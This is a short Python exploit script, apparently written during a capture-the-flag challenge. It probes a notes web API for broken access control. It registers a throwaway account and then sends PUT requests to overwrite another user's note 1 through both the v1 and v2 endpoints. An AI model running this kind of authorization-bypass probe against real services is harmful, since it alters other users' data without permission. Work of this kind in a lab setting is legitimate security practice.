# The HTML returned for /api/v2/notes/1 implies that the backend doesn't have an endpoint for `GET /api/v2/notes/:id`.
# The frontend probably uses `GET /api/v2/notes` which returns ALL notes for the user, and handles it client-side.
# If we look at `app.js`:
# `const { notes } = await api('/notes');`
# So there's NO `GET /api/v2/notes/:id`.

# Wait, `app.js` has:
# `await api(`/notes/${id}`, { method: 'DELETE' });`
# `await api(`/notes/${state.editingId}`, { method: 'PUT', body: JSON.stringify(payload) });`

# Let's try to `PUT` note 1!
import requests

r_reg = requests.post("http://exp.cybergame.sk:7021/api/v2/register", json={"username": "admin2012", "password": "password"}, headers={"Content-Type": "application/json"})
token = r_reg.json().get("token")

payload = {"title": "hacked", "content": "hacked"}
r = requests.put("http://exp.cybergame.sk:7021/api/v2/notes/1", json=payload, headers={"Authorization": f"Bearer {token}"})
print("PUT note 1 v2:", r.status_code, r.text)

r = requests.put("http://exp.cybergame.sk:7021/api/v1/notes/1", json=payload, headers={"Authorization": f"Bearer {token}"})
print("PUT note 1 v1:", r.status_code, r.text)
